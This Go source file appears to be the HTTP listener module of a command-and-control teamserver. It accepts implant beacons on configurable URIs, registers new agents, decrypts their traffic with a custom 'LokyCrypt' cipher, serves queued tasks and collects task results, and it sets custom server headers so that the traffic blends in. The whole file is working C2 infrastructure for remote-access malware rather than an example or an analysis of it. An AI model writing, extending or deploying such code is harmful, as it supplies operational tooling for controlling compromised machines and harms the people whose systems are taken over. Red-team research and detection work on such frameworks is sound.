package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/big"
	"net/http"
	// "net/url"
	"os"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"golang.org/x/net/context"
)

type HTTPConfig struct {
	HostBind           string `json:"host_bind"`
	PortBind           int    `json:"port_bind"`
	Callback_addresses string `json:"callback_addresses"`

	Ssl         bool   `json:"ssl"`
	SslCert     []byte `json:"ssl_cert"`
	SslKey      []byte `json:"ssl_key"`
	SslCertPath string `json:"ssl_cert_path"`
	SslKeyPath  string `json:"ssl_key_path"`

	// agent
	Uri 	       string `json:"uri"`
	HttpMethod 	   string `json:"http_method"`
	UserAgent 	   string `json:"user_agent"`
	RequestHeaders string `json:"request_headers"`

	ProxyUrl 	  string `json:"proxy_url"`
	ProxyUserName string `json:"proxy_user"`
	ProxyPassword string `json:"proxy_pass"`

	CryptKey [16]byte `json:"crypt_key"`

	// server
	ResponseHeaders map[string]string `json:"response_headers"`
	Protocol   	    string 		      `json:"protocol"`
	EncryptKey      []byte       	  `json:"encrypt_key"`
	Server_headers  string 			  `json:"server_headers"`
}

type HTTP struct {
	GinEngine *gin.Engine
	Server    *http.Server
	Config    HTTPConfig
	Name      string
	Active    bool
}

func (handler *HTTP) getKeyFromRequest(bodyBytes []byte) []byte {    
    var key []byte

    if len(bodyBytes) < 16 {
        fmt.Printf("request body too small: expected at least 16 bytes, got %d", len(bodyBytes))
		return nil
    }

	key = bodyBytes[len(bodyBytes)-16:]
	fmt.Printf("[INFO] Using key from last 16 bytes of request: %02x\n", key)

    var keyArray [16]byte
    copy(keyArray[:], key)
    handler.Config.CryptKey = keyArray

    return key
}

func (handler *HTTP) ValidateConfig() error {
    var missing []string
    
    if handler.Config.Uri == "" {
        missing = append(missing, "Uri")
    }
    if handler.Config.HttpMethod == "" {
        missing = append(missing, "HTTP Method")
    }
    if handler.Config.HostBind == "" {
        missing = append(missing, "host bind")
    }
    if handler.Config.PortBind == 0 {
        missing = append(missing, "port bind")
    }
    if handler.Config.Callback_addresses == "" {
        missing = append(missing, "callback addresses")
    }
    
    if len(missing) > 0 {
        return fmt.Errorf("incomplete configuration. Missing required fields: %s", strings.Join(missing, ", "))
    }
    
    return nil
}

func (handler *HTTP) Start(ts Teamserver) error {
	var err error = nil

	cfg := handler.Config
    fmt.Println("=== HTTP CONFIG ===")
    fmt.Printf("HostBind: %s\n", cfg.HostBind)
    fmt.Printf("PortBind: %d\n", cfg.PortBind)
    fmt.Printf("Callback_addresses: %s\n", cfg.Callback_addresses)
    
    fmt.Printf("Ssl: %t\n", cfg.Ssl)
    fmt.Printf("SslCert: %v (length: %d)\n", cfg.SslCert, len(cfg.SslCert))
    fmt.Printf("SslKey: %v (length: %d)\n", cfg.SslKey, len(cfg.SslKey))
    fmt.Printf("SslCertPath: %s\n", cfg.SslCertPath)
    fmt.Printf("SslKeyPath: %s\n", cfg.SslKeyPath)
    
    fmt.Printf("Uri: %s\n", cfg.Uri)
    fmt.Printf("HttpMethod: %s\n", cfg.HttpMethod)
    fmt.Printf("UserAgent: %s\n", cfg.UserAgent)
    fmt.Printf("RequestHeaders: %s\n", cfg.RequestHeaders)
    
    fmt.Printf("ProxyUrl: %s\n", cfg.ProxyUrl)
    fmt.Printf("ProxyUserName: %s\n", cfg.ProxyUserName)
    fmt.Printf("ProxyPassword: %s\n", cfg.ProxyPassword)
    
    fmt.Printf("ResponseHeaders: %v\n", cfg.ResponseHeaders)
    fmt.Printf("Protocol: %s\n", cfg.Protocol)
    fmt.Printf("Server_headers: %s\n", cfg.Server_headers)
    fmt.Println("===================")

	if err := handler.ValidateConfig(); err != nil {
    	return err
	}

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()

	switch strings.ToUpper(cfg.HttpMethod) {
	case "GET":
		router.GET("/*endpoint", handler.processRequest)
	case "POST":
		router.POST("/*endpoint", handler.processRequest)
	default:
		router.POST("/*endpoint", handler.processRequest)
	}

	handler.Active = true

	handler.Server = &http.Server{
		Addr:    fmt.Sprintf("%s:%d", handler.Config.HostBind, handler.Config.PortBind),
		Handler: router,
	}

	if handler.Config.Ssl {
		fmt.Printf("   Started listener: https://%s:%d\n", handler.Config.HostBind, handler.Config.PortBind)

		listenerPath := ListenerDataDir + "/" + handler.Name
		_, err = os.Stat(listenerPath)
		if os.IsNotExist(err) {
			err = os.Mkdir(listenerPath, os.ModePerm)
			if err != nil {
				return fmt.Errorf("failed to create %s folder: %s", listenerPath, err.Error())
			}
		}

		handler.Config.SslCertPath = listenerPath + "/listener.crt"
		handler.Config.SslKeyPath  = listenerPath + "/listener.key"

		if len(handler.Config.SslCert) == 0 || len(handler.Config.SslKey) == 0 {
			err = handler.generateSelfSignedCert(handler.Config.SslCertPath, handler.Config.SslKeyPath)
			if err != nil {
				handler.Active = false
				fmt.Println("Error generating self-signed certificate:", err)
				return err
			}
		} else {
			err = os.WriteFile(handler.Config.SslCertPath, handler.Config.SslCert, 0600)
			if err != nil {
				return err
			}
			err = os.WriteFile(handler.Config.SslKeyPath, handler.Config.SslKey, 0600)
			if err != nil {
				return err
			}
		}

		go func() {
			err = handler.Server.ListenAndServeTLS(handler.Config.SslCertPath, handler.Config.SslKeyPath)
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTPS server: %v\n", err)
				return
			}
			handler.Active = true
		}()

	} else {
		fmt.Printf("   Started listener: http://%s:%d\n", handler.Config.HostBind, handler.Config.PortBind)

		go func() {
			err = handler.Server.ListenAndServe()
			if err != nil && !errors.Is(err, http.ErrServerClosed) {
				fmt.Printf("Error starting HTTP server: %v\n", err)
				return
			}
			handler.Active = true
		}()
	}

	time.Sleep(500 * time.Millisecond)
	return err
}

func (handler *HTTP) Stop() error {
	var (
		ctx          context.Context
		cancel       context.CancelFunc
		err          error = nil
		listenerPath       = ListenerDataDir + "/" + handler.Name
	)

	ctx, cancel = context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	_, err = os.Stat(listenerPath)
	if err == nil {
		err = os.RemoveAll(listenerPath)
		if err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	err = handler.Server.Shutdown(ctx)
	return err
}

func (handler *HTTP) processRequest(ctx *gin.Context) {
	var (
		ExternalIP   string
		err          error
		agentType    string
		oldUID       []byte
		oldAgentId   string
		bodyData     []byte
		responseData []byte
	)

	currentPath := ctx.Request.URL.Path
	valid := false

	if strings.TrimSpace(handler.Config.Uri) == "" {
		fmt.Printf("[INFO] No URI filter configured, accepting all paths. Current path: %s\n", currentPath)
		valid = true
	} else {
		uris := strings.Split(handler.Config.Uri, "\n")
		fmt.Printf("[DEBUG] Configured URIs: %v\n", uris)
		fmt.Printf("[DEBUG] Current path: %s\n", currentPath)
		
		for _, uri := range uris {
			uri = strings.TrimSpace(uri)
			if uri == "" {
				continue
			}
			if !strings.HasPrefix(uri, "/") {
				uri = "/" + uri
			}
			
			if currentPath == uri {
				valid = true
				fmt.Printf("[DEBUG] Path matched URI: %s\n", uri)
				break
			}
		}
		
		if !valid {
			fmt.Printf("[WARN] Path '%s' not in allowed URIs\n", currentPath)
		}
	}

	if !valid {
		fmt.Printf("[ERROR] Rejecting request to path: %s\n", currentPath)
		
		handler.applyServerHeaders(ctx)
		
		ctx.JSON(404, gin.H{"error": "not found"})
		return
	}

	fmt.Printf("[INFO] Processing valid request for path: %s from %s\n", currentPath, ctx.Request.RemoteAddr)

	ExternalIP = strings.Split(ctx.Request.RemoteAddr, ":")[0]

	agentType, oldUID, bodyData, err = handler.parseBeatAndData(ctx)
	if err != nil {
		fmt.Printf("[ERROR] Failed to parse beat and data: %v\n", err)
		goto ERR
	}

	if len(oldUID) < 8 {
		fmt.Println("[ERROR] oldUID too short")
		goto ERR
	}
	oldAgentId = string(oldUID[:8])

	if !ModuleObject.ts.TsAgentIsExists(oldAgentId) {
		fmt.Printf("[INFO] Creating new agent: %s\n", oldAgentId)

		keyOne := handler.getKeyFromRequest(bodyData)
		cryptOne := NewLokyCrypt(keyOne, keyOne)
		decrypted := cryptOne.Decrypt(bodyData)

		agentData, err := ModuleObject.ts.TsAgentCreate(agentType, oldAgentId, decrypted, handler.Name, ExternalIP, true)
		if err != nil {
			fmt.Printf("[ERROR] Failed to create agent: %v\n", err)
			goto ERR
		}

		randomId := make([]byte, 19)
		_, _ = rand.Read(randomId)
		newUID := []byte(agentData.Id + hex.EncodeToString(randomId))

		keyTwo := handler.Config.CryptKey[:]
		cryptTwo := NewLokyCrypt(keyTwo, keyTwo)
		encrypted := cryptTwo.Encrypt(newUID)

		responseData = []byte(base64.StdEncoding.EncodeToString(append(oldUID, encrypted...)))

	} else if len(bodyData) > 0 {
		fmt.Printf("[INFO] Processing data for existing agent: %s\n", oldAgentId)

		_ = ModuleObject.ts.TsAgentSetTick(oldAgentId)

		keyOne := handler.Config.CryptKey[:]
		cryptOne := NewLokyCrypt(keyOne, keyOne)
		decrypted := cryptOne.Decrypt(bodyData)

		if decrypted[0] == 0 { // Get Tasks
			hostedData, err := ModuleObject.ts.TsAgentGetHostedAll(oldAgentId, 0x12c0000) // 25 Mb * 0,75 for base64
			if len(hostedData) > 0 {

				key := handler.Config.CryptKey[:]
				crypt := NewLokyCrypt(key, key)
				encrypted := crypt.Encrypt(hostedData)

				responseData = []byte(base64.StdEncoding.EncodeToString(append(oldUID, encrypted...)))
				if err != nil {
					goto ERR
				}
			}
		} else if decrypted[0] == 1 { // Tasks result

			_ = ModuleObject.ts.TsAgentProcessData(oldAgentId, decrypted[1:])

		} else if decrypted[0] == 5 || decrypted[0] == 7 { // QuickMsg || QuickOut

			_ = ModuleObject.ts.TsAgentProcessData(oldAgentId, append([]byte{0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0}, decrypted...))

		} else {
			fmt.Printf("[WARN] Unknown body data type: %d\n", decrypted[0])
		}
	}

	handler.applyServerHeaders(ctx)

	if len(responseData) > 0 {
		fmt.Printf("[INFO] Sending response (%d bytes) to agent: %s\n", len(responseData), oldAgentId)
		_, err = ctx.Writer.Write(responseData)
		if err != nil {
			fmt.Printf("[ERROR] Failed to write response: %v\n", err)
			return
		}
	} else {
		fmt.Printf("[INFO] Sending empty response to agent: %s\n", oldAgentId)
	}

	ctx.AbortWithStatus(http.StatusOK)
	return

ERR:
	fmt.Println("[ERROR] Request processing failed")
	
	handler.applyServerHeaders(ctx)
	
	ctx.AbortWithStatus(http.StatusInternalServerError)
	return
}

func (handler *HTTP) applyServerHeaders(ctx *gin.Context) {
	if handler.Config.ResponseHeaders != nil && len(handler.Config.ResponseHeaders) > 0 {
		for key, value := range handler.Config.ResponseHeaders {
			ctx.Header(key, value)
		}
	}

	if handler.Config.Server_headers != "" {
		lines := strings.Split(handler.Config.Server_headers, "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}

			if strings.HasPrefix(line, "#") {
				continue
			}

			parts := strings.SplitN(line, ":", 2)
			if len(parts) == 2 {
				key := strings.TrimSpace(parts[0])
				value := strings.TrimSpace(parts[1])
				
				if key != "" && value != "" {
					ctx.Header(key, value)
				}
			}
		}
	}
}

func (handler *HTTP) parseBeatAndData(ctx *gin.Context) (string, []byte, []byte, error) {

	bodyData, err := io.ReadAll(ctx.Request.Body)
	if err != nil {
		return "", nil, nil, errors.New("missing agent data")
	}

	agentInfoCrypt, err := base64.StdEncoding.DecodeString(string(bodyData))
	if err != nil {
		return "", nil, nil, errors.New("missing agent data")
	}

	if len(agentInfoCrypt) < 36 {
		return "", nil, nil, errors.New("missing agent data")
	}

	decryptedPart := agentInfoCrypt[36:]

	return "c17a905a", agentInfoCrypt[:36], decryptedPart, nil
}

func (handler *HTTP) generateSelfSignedCert(certFile, keyFile string) error {
	var (
		certData   []byte
		keyData    []byte
		certBuffer bytes.Buffer
		keyBuffer  bytes.Buffer
		privateKey *rsa.PrivateKey
		err        error
	)

	privateKey, err = rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate private key: %v", err)
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	template.DNSNames = []string{handler.Config.HostBind}

	certData, err = x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return fmt.Errorf("failed to create certificate: %v", err)
	}

	err = pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData})
	if err != nil {
		return fmt.Errorf("failed to write certificate: %v", err)
	}

	handler.Config.SslCert = certBuffer.Bytes()
	err = os.WriteFile(certFile, handler.Config.SslCert, 0644)
	if err != nil {
		return fmt.Errorf("failed to create certificate file: %v", err)
	}

	keyData = x509.MarshalPKCS1PrivateKey(privateKey)
	err = pem.Encode(&keyBuffer, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyData})
	if err != nil {
		return fmt.Errorf("failed to write private key: %v", err)
	}

	handler.Config.SslKey = keyBuffer.Bytes()
	err = os.WriteFile(keyFile, handler.Config.SslKey, 0644)
	if err != nil {
		return fmt.Errorf("failed to create key file: %v", err)
	}

	return nil
}
